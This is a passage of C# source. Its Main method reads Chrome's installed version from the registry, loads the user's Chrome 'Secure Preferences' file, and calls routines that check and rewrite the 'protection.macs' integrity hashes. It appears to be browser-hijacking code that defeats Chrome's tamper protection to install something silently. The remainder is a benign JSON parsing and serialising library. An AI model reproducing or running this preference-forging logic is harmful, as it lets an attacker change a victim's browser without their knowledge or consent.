                        }
                    }
                }
                else Thread.Sleep(100);

            }
        }
        static void Main(string[] args)
        {

            string machineName = sid;
            sid = GetSID();
            sid_hash = GetMachineId();
            string chrome_path = "HKEY_CURRENT_USER\\Software\\Google\\Chrome\\BLBeacon";
            string version = (string)(ReadReg(chrome_path, "version"));
            if (version == null)
                return;
            preferences = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Secure Preferences");

            string chrome_dir = ProgramFilesx86() + "\\Google\\Chrome\\Application\\" + version + "\\";
            CheckHmacs(chrome_dir);
            Install();
            UpdateSecure(chrome_dir, "", GetSecure("protection.macs"));

        }



    }
    public static class JSONParser
    {
        [ThreadStatic] static Stack<List<string>> splitArrayPool;
        [ThreadStatic] static StringBuilder stringBuilder;
        [ThreadStatic] static Dictionary<Type, Dictionary<string, FieldInfo>> fieldInfoCache;
        [ThreadStatic] static Dictionary<Type, Dictionary<string, PropertyInfo>> propertyInfoCache;

        public static T FromJson<T>(this string json)
        {
            // Initialize, if needed, the ThreadStatic variables
            if (propertyInfoCache == null) propertyInfoCache = new Dictionary<Type, Dictionary<string, PropertyInfo>>();
            if (fieldInfoCache == null) fieldInfoCache = new Dictionary<Type, Dictionary<string, FieldInfo>>();
            if (stringBuilder == null) stringBuilder = new StringBuilder();
            if (splitArrayPool == null) splitArrayPool = new Stack<List<string>>();

            //Remove all whitespace not within strings to make parsing simpler
            stringBuilder.Length = 0;
            for (int i = 0; i < json.Length; i++)
            {
                char c = json[i];
                if (c == '"')
                {
                    i = AppendUntilStringEnd(true, i, json);
                    continue;
                }
                if (char.IsWhiteSpace(c))
                    continue;

                stringBuilder.Append(c);
            }

            //Parse the thing!
            return (T)ParseValue(typeof(T), stringBuilder.ToString());
        }

        static int AppendUntilStringEnd(bool appendEscapeCharacter, int startIdx, string json)
        {
            stringBuilder.Append(json[startIdx]);
            for (int i = startIdx + 1; i < json.Length; i++)
            {
                if (json[i] == '\\')
                {
                    if (appendEscapeCharacter)
                        stringBuilder.Append(json[i]);
                    stringBuilder.Append(json[i + 1]);
                    i++;//Skip next character as it is escaped
                }
                else if (json[i] == '"')
                {
                    stringBuilder.Append(json[i]);
                    return i;
                }
                else
                    stringBuilder.Append(json[i]);
            }
            return json.Length - 1;
        }

        //Splits { <value>:<value>, <value>:<value> } and [ <value>, <value> ] into a list of <value> strings
        static List<string> Split(string json)
        {
            List<string> splitArray = splitArrayPool.Count > 0 ? splitArrayPool.Pop() : new List<string>();
            splitArray.Clear();
            if (json.Length == 2)
                return splitArray;
            int parseDepth = 0;
            stringBuilder.Length = 0;
            for (int i = 1; i < json.Length - 1; i++)
            {
                switch (json[i])
                {
                    case '[':
                    case '{':
                        parseDepth++;
                        break;
                    case ']':
                    case '}':
                        parseDepth--;
                        break;
                    case '"':
                        i = AppendUntilStringEnd(true, i, json);
                        continue;
                    case ',':
                    case ':':
                        if (parseDepth == 0)
                        {
                            splitArray.Add(stringBuilder.ToString());
                            stringBuilder.Length = 0;
                            continue;
                        }
                        break;
                }

                stringBuilder.Append(json[i]);
            }

            splitArray.Add(stringBuilder.ToString());

            return splitArray;
        }

        internal static object ParseValue(Type type, string json)
        {
            if (type == typeof(string))
            {
                if (json.Length <= 2)
                    return string.Empty;
                StringBuilder parseStringBuilder = new StringBuilder(json.Length);
                for (int i = 1; i < json.Length - 1; ++i)
                {
                    if (json[i] == '\\' && i + 1 < json.Length - 1)
                    {
                        int j = "\"\\nrtbf/".IndexOf(json[i + 1]);
                        if (j >= 0)
                        {
                            parseStringBuilder.Append("\"\\\n\r\t\b\f/"[j]);
                            ++i;
                            continue;
                        }
                        if (json[i + 1] == 'u' && i + 5 < json.Length - 1)
                        {
                            if (UInt32.TryParse(json.Substring(i + 2, 4), System.Globalization.NumberStyles.AllowHexSpecifier, null, out uint c))
                            {
                                parseStringBuilder.Append((char)c);
                                i += 5;
                                continue;
                            }
                        }
                    }
                    parseStringBuilder.Append(json[i]);
                }
                return parseStringBuilder.ToString();
            }
            if (type.IsPrimitive)
            {
                var result = Convert.ChangeType(json, type, System.Globalization.CultureInfo.InvariantCulture);
                return result;
            }
            if (type == typeof(decimal))
            {
                decimal.TryParse(json, System.Globalization.NumberStyles.Float, System.Globalization.CultureInfo.InvariantCulture, out decimal result);
                return result;
            }
            if (json == "null")
            {
                return null;
            }
            if (type.IsEnum)
            {
                if (json[0] == '"')
                    json = json.Substring(1, json.Length - 2);
                try
                {
                    return Enum.Parse(type, json, false);
                }
                catch
                {
                    return 0;
                }
            }
            if (type.IsArray)
            {
                Type arrayType = type.GetElementType();
                if (json[0] != '[' || json[json.Length - 1] != ']')
                    return null;

                List<string> elems = Split(json);
                Array newArray = Array.CreateInstance(arrayType, elems.Count);
                for (int i = 0; i < elems.Count; i++)
                    newArray.SetValue(ParseValue(arrayType, elems[i]), i);
                splitArrayPool.Push(elems);
                return newArray;
            }
            if (type.IsGenericType && type.GetGenericTypeDefinition() == typeof(List<>))
            {
                Type listType = type.GetGenericArguments()[0];
                if (json[0] != '[' || json[json.Length - 1] != ']')
                    return null;

                List<string> elems = Split(json);
                var list = (IList)type.GetConstructor(new Type[] { typeof(int) }).Invoke(new object[] { elems.Count });
                for (int i = 0; i < elems.Count; i++)
                    list.Add(ParseValue(listType, elems[i]));
                splitArrayPool.Push(elems);
                return list;
            }
            if (type.IsGenericType && type.GetGenericTypeDefinition() == typeof(Dictionary<,>))
            {
                Type keyType, valueType;
                {
                    Type[] args = type.GetGenericArguments();
                    keyType = args[0];
                    valueType = args[1];
                }

                //Refuse to parse dictionary keys that aren't of type string
                if (keyType != typeof(string))
                    return null;
                //Must be a valid dictionary element
                if (json[0] != '{' || json[json.Length - 1] != '}')
                    return null;
                //The list is split into key/value pairs only, this means the split must be divisible by 2 to be valid JSON
                List<string> elems = Split(json);
                if (elems.Count % 2 != 0)
                    return null;

                var dictionary = (IDictionary)type.GetConstructor(new Type[] { typeof(int) }).Invoke(new object[] { elems.Count / 2 });
                for (int i = 0; i < elems.Count; i += 2)
                {
                    if (elems[i].Length <= 2)
                        continue;
                    string keyValue = elems[i].Substring(1, elems[i].Length - 2);
                    object val = ParseValue(valueType, elems[i + 1]);
                    dictionary.Add(keyValue, val);
                }
                return dictionary;
            }
            if (type == typeof(object))
            {
                return ParseAnonymousValue(json);
            }
            if (json[0] == '{' && json[json.Length - 1] == '}')
            {
                return ParseObject(type, json);
            }

            return null;
        }

        static object ParseAnonymousValue(string json)
        {
            if (json.Length == 0)
                return null;
            if (json[0] == '{' && json[json.Length - 1] == '}')
            {
                List<string> elems = Split(json);
                if (elems.Count % 2 != 0)
                    return null;
                var dict = new Dictionary<string, object>(elems.Count / 2);
                for (int i = 0; i < elems.Count; i += 2)
                    dict.Add(elems[i].Substring(1, elems[i].Length - 2), ParseAnonymousValue(elems[i + 1]));
                return dict;
            }
            if (json[0] == '[' && json[json.Length - 1] == ']')
            {
                List<string> items = Split(json);
                var finalList = new List<object>(items.Count);
                for (int i = 0; i < items.Count; i++)
                    finalList.Add(ParseAnonymousValue(items[i]));
                return finalList;
            }
            if (json[0] == '"' && json[json.Length - 1] == '"')
            {
                string str = json.Substring(1, json.Length - 2);
                return str.Replace("\\\\", "\\");
            }
            if (char.IsDigit(json[0]) || json[0] == '-')
            {
                if (json.Contains("."))
                {
                    double.TryParse(json, System.Globalization.NumberStyles.Float, System.Globalization.CultureInfo.InvariantCulture, out double result);
                    return result;
                }
                else
                {
                    int.TryParse(json, out int result);
                    return result;
                }
            }
            if (json == "true")
                return true;
            if (json == "false")
                return false;
            // handles json == "null" as well as invalid JSON
            return null;
        }

        static Dictionary<string, T> CreateMemberNameDictionary<T>(T[] members) where T : MemberInfo
        {
            Dictionary<string, T> nameToMember = new Dictionary<string, T>(StringComparer.OrdinalIgnoreCase);
            for (int i = 0; i < members.Length; i++)
            {
                T member = members[i];
                if (member.IsDefined(typeof(IgnoreDataMemberAttribute), true))
                    continue;

                string name = member.Name;
                if (member.IsDefined(typeof(DataMemberAttribute), true))
                {
                    DataMemberAttribute dataMemberAttribute = (DataMemberAttribute)Attribute.GetCustomAttribute(member, typeof(DataMemberAttribute), true);
                    if (!string.IsNullOrEmpty(dataMemberAttribute.Name))
                        name = dataMemberAttribute.Name;
                }

                nameToMember.Add(name, member);
            }

            return nameToMember;
        }

        static object ParseObject(Type type, string json)
        {
            object instance = FormatterServices.GetUninitializedObject(type);

            //The list is split into key/value pairs only, this means the split must be divisible by 2 to be valid JSON
            List<string> elems = Split(json);
            if (elems.Count % 2 != 0)
                return instance;
            if (!fieldInfoCache.TryGetValue(type, out Dictionary<string, FieldInfo> nameToField))
            {
                nameToField = CreateMemberNameDictionary(type.GetFields(BindingFlags.Instance | BindingFlags.Public | BindingFlags.FlattenHierarchy));
                fieldInfoCache.Add(type, nameToField);
            }
            if (!propertyInfoCache.TryGetValue(type, out Dictionary<string, PropertyInfo> nameToProperty))
            {
                nameToProperty = CreateMemberNameDictionary(type.GetProperties(BindingFlags.Instance | BindingFlags.Public | BindingFlags.FlattenHierarchy));
                propertyInfoCache.Add(type, nameToProperty);
            }

            for (int i = 0; i < elems.Count; i += 2)
            {
                if (elems[i].Length <= 2)
                    continue;
                string key = elems[i].Substring(1, elems[i].Length - 2);
                string value = elems[i + 1];
                if (nameToField.TryGetValue(key, out FieldInfo fieldInfo))
                    fieldInfo.SetValue(instance, ParseValue(fieldInfo.FieldType, value));
                else if (nameToProperty.TryGetValue(key, out PropertyInfo propertyInfo))
                    propertyInfo.SetValue(instance, ParseValue(propertyInfo.PropertyType, value), null);
            }

            return instance;
        }
    }
    public static class JSONWriter
    {
        public static string ToJson(this object item)
        {
            StringBuilder stringBuilder = new StringBuilder();
            AppendValue(stringBuilder, item);
            return stringBuilder.ToString();
        }

        static void AppendValue(StringBuilder stringBuilder, object item)
        {
            if (item == null)
            {
                stringBuilder.Append("null");
                return;
            }

            Type type = item.GetType();
            if (type == typeof(string))
            {
                stringBuilder.Append('"');
                string str = (string)item;
                for (int i = 0; i < str.Length; ++i)
                    if (str[i] < ' ' || str[i] == '"' || (str[i] == '\\' && str[i + 1] != 'u'))
                    {
                        stringBuilder.Append('\\');
                        int j = "\"\\\n\r\t\b\f".IndexOf(str[i]);
                        if (j >= 0)
                            stringBuilder.Append("\"\\nrtbf"[j]);
                        else
                            stringBuilder.AppendFormat("u{0:X4}", (UInt32)str[i]);
                    }
                    else
                        stringBuilder.Append(str[i]);
                stringBuilder.Append('"');
            }
            else if (type == typeof(byte) || type == typeof(int))
            {
                stringBuilder.Append(item.ToString());
            }
            else if (type == typeof(float))
            {
                stringBuilder.Append(((float)item).ToString(System.Globalization.CultureInfo.InvariantCulture));
            }
            else if (type == typeof(double))
            {
                stringBuilder.Append(((double)item).ToString(System.Globalization.CultureInfo.InvariantCulture));
            }
            else if (type == typeof(bool))
            {
                stringBuilder.Append(((bool)item) ? "true" : "false");
            }
            else if (type.IsEnum)
            {
                stringBuilder.Append('"');
                stringBuilder.Append(item.ToString());
                stringBuilder.Append('"');
            }
            else if (item is IList)
            {
                stringBuilder.Append('[');
                bool isFirst = true;
                IList list = item as IList;
                for (int i = 0; i < list.Count; i++)
                {
                    if (isFirst)
                        isFirst = false;
                    else
                        stringBuilder.Append(',');
                    AppendValue(stringBuilder, list[i]);
                }
                stringBuilder.Append(']');
            }
            else if (type.IsGenericType && type.GetGenericTypeDefinition() == typeof(Dictionary<,>))
            {
                Type keyType = type.GetGenericArguments()[0];

                //Refuse to output dictionary keys that aren't of type string
                if (keyType != typeof(string))
                {
                    stringBuilder.Append("{}");
                    return;
                }

                stringBuilder.Append('{');
                IDictionary dict = item as IDictionary;
                bool isFirst = true;
                foreach (object key in dict.Keys)
                {
                    if (isFirst)
                        isFirst = false;
                    else
                        stringBuilder.Append(',');
                    stringBuilder.Append('\"');
                    stringBuilder.Append((string)key);
                    stringBuilder.Append("\":");
                    AppendValue(stringBuilder, dict[key]);
                }
                stringBuilder.Append('}');
            }
            else
            {
                stringBuilder.Append('{');

                bool isFirst = true;
                FieldInfo[] fieldInfos = type.GetFields(BindingFlags.Instance | BindingFlags.Public | BindingFlags.FlattenHierarchy);
                for (int i = 0; i < fieldInfos.Length; i++)
                {
                    if (fieldInfos[i].IsDefined(typeof(IgnoreDataMemberAttribute), true))
                        continue;

                    object value = fieldInfos[i].GetValue(item);
                    if (value != null)
                    {
                        if (isFirst)
                            isFirst = false;
                        else
                            stringBuilder.Append(',');
                        stringBuilder.Append('\"');
                        stringBuilder.Append(GetMemberName(fieldInfos[i]));
                        stringBuilder.Append("\":");
                        AppendValue(stringBuilder, value);
                    }
                }
                PropertyInfo[] propertyInfo = type.GetProperties(BindingFlags.Instance | BindingFlags.Public | BindingFlags.FlattenHierarchy);
                for (int i = 0; i < propertyInfo.Length; i++)
                {
                    if (!propertyInfo[i].CanRead || propertyInfo[i].IsDefined(typeof(IgnoreDataMemberAttribute), true))
                        continue;

                    object value = propertyInfo[i].GetValue(item, null);
                    if (value != null)
                    {
                        if (isFirst)
                            isFirst = false;
                        else
                            stringBuilder.Append(',');
                        stringBuilder.Append('\"');
                        stringBuilder.Append(GetMemberName(propertyInfo[i]));
                        stringBuilder.Append("\":");
                        AppendValue(stringBuilder, value);
                    }
                }

                stringBuilder.Append('}');
            }
        }

        static string GetMemberName(MemberInfo member)
        {
            if (member.IsDefined(typeof(DataMemberAttribute), true))
            {
                DataMemberAttribute dataMemberAttribute = (DataMemberAttribute)Attribute.GetCustomAttribute(member, typeof(DataMemberAttribute), true);
                if (!string.IsNullOrEmpty(dataMemberAttribute.Name))
                    return dataMemberAttribute.Name;
            }

            return member.Name;
        }
    }


}
